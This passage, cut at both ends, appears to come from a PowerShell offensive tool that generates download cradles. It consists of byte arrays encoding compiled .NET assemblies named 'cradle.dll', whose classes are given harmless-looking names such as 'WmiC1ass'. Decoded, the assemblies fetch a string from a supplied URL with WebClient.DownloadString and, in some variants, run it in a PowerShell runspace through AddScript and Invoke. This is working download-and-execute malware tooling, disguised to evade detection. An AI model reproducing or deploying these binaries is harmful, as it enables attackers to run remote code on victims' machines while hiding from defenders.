1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,41,0,34,0,6,0,93,0,61,0,6,0,125,0,61,0,10,0,177,0,166,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,48,0,10,0,1,0,109,32,0,0,0,0,134,24,55,0,15,0,2,0,0,0,1,0,162,0,17,0,55,0,19,0,25,0,55,0,15,0,33,0,55,0,15,0,33,0,187,0,24,0,9,0,55,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(155,0,0,0,2)+@(0)*11+@(1,0,25,0,0,0,0,0,2)+@(0)*11+@(1,0,34)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,87,77,49,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,0,3,32,0,0,0,0,0,87,3,21,98,36,75,199,70,177,148,217,105,183,244,175,121,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,72,35)+@(0)*8+@(0,0,94,35,0,0,0,32)+@(0)*22+@(80,35)+@(0)*8+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*155+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,112,51)+@(0)*502","$CompiledHeader`100,49,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,238,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(152,36,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,244,4,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(208,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,252,3,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,160,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,112,3,0,0,8,0,0,0,35,85,83,0,120,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,136,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,9,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,11,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,41,0,34,0,6,0,97,0,65,0,6,0,129,0,65,0,10,0,234,0,195,0,10,0,250,0,195,0,10,0,23,1,166,0,14,0,65,1,54,1,6,0,131,1,100,1,10,0,144,1,166,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,48,0,10,0,1,0,146,32,0,0,0,0,134,24,55,0,15,0,2,0,0,0,1,0,61,0,17,0,55,0,19,0,25,0,55,0,15,0,33,0,3,1,33,0,41,0,18,1,15,0,49,0,34,1,38,0,49,0,41,1,43,0,57,0,55,0,15,0,57,0,75,1,49,0,49,0,90,1,54,0,49,0,153,1,60,0,9,0,55,0,15,0,46,0,11,0,76,0,46,0,19,0,85,0,69,0,4,128)+@(0)*16+@(159,0,0,0,4)+@(0)*11+@(1,0,25,0,0,0,0,0,3)+@(0)*11+@(24,0,166,0,0,0,0,0,4)+@(0)*11+@(1,0,34)+@(0)*8+@(0,0,60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,87,77,49,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,3,32,0,0,0,0,0,154,203,63,251,119,204,181,74,153,115,204,160,48,31,82,234,0,8,183,122,92,86,25,52,224,137,4,0,1,1,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,5,32,1,18,25,14,8,32,0,21,18,33,1,18,37,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,192,36)+@(0)*8+@(0,0,222,36,0,0,0,32)+@(0)*22+@(208,36)+@(0)*16+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*282+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,240,52)+@(0)*502","$CompiledHeader`136,49,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,46,37,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(220,36,0,0,79,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,52,5,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(16,37,0,0,0,0,0,0,72,0,0,0,2,0,5,0,168,32,0,0,52,4,0,0,1)+@(0)*55+@(19,48,4,0,65,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,114,1,0,0,112,3,40,9,0,0,10,111,10,0,0,10,38,7,111,11,0,0,10,38,42,30,2,40,12,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,116,1,0,0,35,126,0,0,224,1,0,0,192,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,160,3,0,0,8,0,0,0,35,85,83,0,168,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,184,3,0,0,124,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,37,51,0,22,0,0,1,0,0,0,10,0,0,0,2,0,0,0,2,0,0,0,2,0,0,0,12,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,3,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,41,0,34,0,6,0,115,0,83,0,6,0,147,0,83,0,10,0,252,0,213,0,10,0,12,1,213,0,10,0,41,1,184,0,14,0,83,1,72,1,6,0,108,1,34,0,6,0,163,1,132,1,10,0,176,1,184,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,48,0,10,0,1,0,157,32,0,0,0,0,134,24,55,0,16,0,3,0,0,0,1,0,61,0,0,0,2,0,65,0,17,0,55,0,20,0,25,0,55,0,16,0,33,0,21,1,34,0,41,0,36,1,16,0,49,0,52,1,39,0,49,0,59,1,44,0,57,0,55,0,16,0,57,0,93,1,50,0,65,0,115,1,55,0,49,0,122,1,62,0,49,0,185,1,68,0,9,0,55,0,16,0,46,0,11,0,84,0,46,0,19,0,93,0,77,0,4,128)+@(0)*16+@(177,0,0,0,4)+@(0)*11+@(1,0,25,0,0,0,0,0,3)+@(0)*11+@(25,0,184,0,0,0,0,0,4)+@(0)*11+@(1,0,34)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,87,77,49,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,69,113,117,97,108,115,0,46,99,116,111,114,0,117,114,108,0,112,111,115,116,99,114,97,100,108,101,99,111,109,109,97,110,100,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,0,83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,82,117,110,115,112,97,99,101,115,0,82,117,110,115,112,97,99,101,70,97,99,116,111,114,121,0,82,117,110,115,112,97,99,101,0,67,114,101,97,116,101,82,117,110,115,112,97,99,101,0,79,112,101,110,0,80,111,119,101,114,83,104,101,108,108,0,67,114,101,97,116,101,0,115,101,116,95,82,117,110,115,112,97,99,101,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,83,116,114,105,110,103,0,67,111,110,99,97,116,0,65,100,100,83,99,114,105,112,116,0,83,121,115,116,101,109,46,67,111,108,108,101,99,116,105,111,110,115,46,79,98,106,101,99,116,77,111,100,101,108,0,67,111,108,108,101,99,116,105,111,110,96,49,0,80,83,79,98,106,101,99,116,0,73,110,118,111,107,101,0,0,3,59,0,0,0,0,0,236,54,26,243,66,223,4,68,190,126,235,250,117,145,117,138,0,8,183,122,92,86,25,52,224,137,5,0,2,1,14,14,3,32,0,1,4,32,1,1,8,8,49,191,56,86,173,54,78,53,4,0,0,18,21,4,0,0,18,25,5,32,1,1,18,21,4,32,1,14,14,6,0,3,14,14,14,14,5,32,1,18,25,14,8,32,0,21,18,37,1,18,41,6,7,2,18,21,18,25,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,4,37)+@(0)*8+@(0,0,30,37,0,0,0,32)+@(0)*22+@(16,37)+@(0)*12+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,0,16)+@(0)*218+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,48,53)+@(0)*502"))
    $LegitSoundingClassAndMethodCompiledNormal  += , @('WmiC1ass'      , 'Create'            , @("$CompiledHeader`146,48,17,89)+@(0)*8+@(224,0,2,33,11,1,8,0,0,4,0,0,0,6,0,0,0,0,0,0,126,35,0,0,0,32,0,0,0,64,0,0,0,0,64,0,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(36,35,0,0,87,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,132,3,0,0,0,32,0,0,0,4,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,6)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,10)+@(0)*14+@(64,0,0,66)+@(0)*16+@(96,35,0,0,0,0,0,0,72,0,0,0,2,0,5,0,120,32,0,0,172,2,0,0,1)+@(0)*55+@(19,48,2,0,17,0,0,0,1,0,0,17,0,115,3,0,0,10,2,40,4,0,0,10,10,43,0,6,42,30,2,40,5,0,0,10,42,0,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,50,46,48,46,53,48,55,50,55,0,0,0,0,5,0,108,0,0,0,12,1,0,0,35,126,0,0,120,1,0,0,208,0,0,0,35,83,116,114,105,110,103,115,0,0,0,0,72,2,0,0,8,0,0,0,35,85,83,0,80,2,0,0,16,0,0,0,35,71,85,73,68,0,0,0,96,2,0,0,76,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0,0,250,1,51,0,22,0,0,1,0,0,0,4,0,0,0,2,0,0,0,2,0,0,0,1,0,0,0,5,0,0,0,2,0,0,0,1,0,0,0,1,0,0,0,2,0,0,0,0,0,10,0,1,0,0,0,0,0,6,0,46,0,39,0,6,0,98,0,66,0,6,0,130,0,66,0,10,0,182,0,171,0,0,0,0,0,1,0,0,0,0,0,1,0,1,0,1,0,16,0,21,0,0,0,5,0,1,0,1,0,80,32,0,0,0,0,150,0,53,0,10,0,1,0,109,32,0,0,0,0,134,24,60,0,15,0,2,0,0,0,1,0,167,0,17,0,60,0,19,0,25,0,60,0,15,0,33,0,60,0,15,0,33,0,192,0,24,0,9,0,60,0,15,0,46,0,11,0,33,0,46,0,19,0,42,0,29,0,4,128)+@(0)*16+@(160,0,0,0,2)+@(0)*11+@(1,0,30,0,0,0,0,0,2)+@(0)*11+@(1,0,39)+@(0)*8+@(60,77,111,100,117,108,101,62,0,99,114,97,100,108,101,46,100,108,108,0,87,109,105,67,49,97,115,115,0,109,115,99,111,114,108,105,98,0,83,121,115,116,101,109,0,79,98,106,101,99,116,0,67,114,101,97,116,101,0,46,99,116,111,114,0,83,121,115,116,101,109,46,82,117,110,116,105,109,101,46,67,111,109,112,105,108,101,114,83,101,114,118,105,99,101,115,0,67,111,109,112,105,108,97,116,105,111,110,82,101,108,97,120,97,116,105,111,110,115,65,116,116,114,105,98,117,116,101,0,82,117,110,116,105,109,101,67,111,109,112,97,116,105,98,105,108,105,116,121,65,116,116,114,105,98,117,116,101,0,99,114,97,100,108,101,0,117,114,108,0,83,121,115,116,101,109,46,78,101,116,0,87,101,98,67,108,105,101,110,116,0,68,111,119,110,108,111,97,100,83,116,114,105,110,103,0,0,0,3,32,0,0,0,0,0,21,77,20,103,115,141,122,69,162,86,138,171,156,76,84,202,0,8,183,122,92,86,25,52,224,137,4,0,1,14,14,3,32,0,1,4,32,1,1,8,4,32,1,14,14,3,7,1,14,8,1,0,8,0,0,0,0,0,30,1,0,1,0,84,2,22,87,114,97,112,78,111,110,69,120,99,101,112,116,105,111,110,84,104,114,111,119,115,1,0,0,0,76,35)+@(0)*8+@(0,0,110,35,0,0,0,32)+@(0)*22+@(96,35)+@(0)*20+@(95,67,111,114,68,108,108,77,97,105,110,0,109,115,99,111,114,101,101,46,100,108,108,0,0,0,0,0,255,37,0,32,64)+@(0)*139+@(1,0,16,0,0,0,24,0,0,128)+@(0)*14+@(1,0,1,0,0,0,48,0,0,128)+@(0)*14+@(1,0,0,0,0,0,72,0,0,0,88,64,0,0,68,2)+@(0)*8+@(0,0,68,2,52,0,0,0,86,0,83,0,95,0,86,0,69,0,82,0,83,0,73,0,79,0,78,0,95,0,73,0,78,0,70,0,79,0,0,0,0,0,189,4,239,254,0,0,1)+@(0)*16+@(0,63)+@(0)*7+@(4,0,0,0,2)+@(0)*14+@(0,68,0,0,0,1,0,86,0,97,0,114,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,0,0,36,0,4,0,0,0,84,0,114,0,97,0,110,0,115,0,108,0,97,0,116,0,105,0,111,0,110)+@(0)*7+@(176,4,164,1,0,0,1,0,83,0,116,0,114,0,105,0,110,0,103,0,70,0,105,0,108,0,101,0,73,0,110,0,102,0,111,0,0,0,128,1,0,0,1,0,48,0,48,0,48,0,48,0,48,0,52,0,98,0,48,0,0,0,44,0,2,0,1,0,70,0,105,0,108,0,101,0,68,0,101,0,115,0,99,0,114,0,105,0,112,0,116,0,105,0,111,0,110,0,0,0,0,0,32,0,0,0,48,0,8,0,1,0,70,0,105,0,108,0,101,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,11,0,1,0,73,0,110,0,116,0,101,0,114,0,110,0,97,0,108,0,78,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,40,0,2,0,1,0,76,0,101,0,103,0,97,0,108,0,67,0,111,0,112,0,121,0,114,0,105,0,103,0,104,0,116,0,0,0,32,0,0,0,64,0,11,0,1,0,79,0,114,0,105,0,103,0,105,0,110,0,97,0,108,0,70,0,105,0,108,0,101,0,110,0,97,0,109,0,101,0,0,0,99,0,114,0,97,0,100,0,108,0,101,0,46,0,100,0,108,0,108,0,0,0,0,0,52,0,8,0,1,0,80,0,114,0,111,0,100,0,117,0,99,0,116,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48,0,0,0,56,0,8,0,1,0,65,0,115,0,115,0,101,0,109,0,98,0,108,0,121,0,32,0,86,0,101,0,114,0,115,0,105,0,111,0,110,0,0,0,48,0,46,0,48,0,46,0,48,0,46,0,48)+@(0)*360+@(32,0,0,12,0,0,0,128,51)+@(0)*502","$CompiledHeader`172,48,17,89)+@(0)*8+@(224,0,2,33,11,1,11,0,0,6,0,0,0,6,0,0,0,0,0,0,238,36,0,0,0,32,0,0,0,64,0,0,0,0,0,16,0,32,0,0,0,2,0,0,4)+@(0)*7+@(4)+@(0)*8+@(128,0,0,0,2,0,0,0,0,0,0,3,0,64,133,0,0,16,0,0,16,0,0,0,0,16,0,0,16,0,0,0,0,0,0,16)+@(0)*11+@(152,36,0,0,83,0,0,0,0,64,0,0,160,2)+@(0)*19+@(96,0,0,12)+@(0)*52+@(32,0,0,8)+@(0)*11+@(8,32,0,0,72)+@(0)*11+@(46,116,101,120,116,0,0,0,244,4,0,0,0,32,0,0,0,6,0,0,0,2)+@(0)*14+@(32,0,0,96,46,114,115,114,99,0,0,0,160,2,0,0,0,64,0,0,0,4,0,0,0,8)+@(0)*14+@(64,0,0,64,46,114,101,108,111,99,0,0,12,0,0,0,0,96,0,0,0,2,0,0,0,12)+@(0)*14+@(64,0,0,66)+@(0)*16+@(208,36,0,0,0,0,0,0,72,0,0,0,2,0,5,0,156,32,0,0,252,3,0,0,1)+@(0)*55+@(19,48,3,0,54,0,0,0,1,0,0,17,0,40,3,0,0,10,10,6,111,4,0,0,10,0,40,5,0,0,10,11,7,6,111,6,0,0,10,0,7,115,7,0,0,10,2,40,8,0,0,10,111,9,0,0,10,38,7,111,10,0,0,10,38,42,30,2,40,11,0,0,10,42,0,0,66,83,74,66,1,0,1,0,0,0,0,0,12,0,0,0,118,52,46,48,46,51,48,51,49,57,0,0,0,0,5,0,108,0,0,0,100,1,0,0,35,126,0,0,208,1,0,0,160,1,0,0,35,83,116,114,105,110,103,115,0,0,0,0,112,3,0,0,8,0,0,0,35,85,83,0,120,3,0,0,16,0,0,0,35,71,85,73,68,0,0,0,136,3,0,0,116,0,0,0,35,66,108,111,98)+@(0)*7+@(2,0,0,1,71,21,2,0,9,0,0,0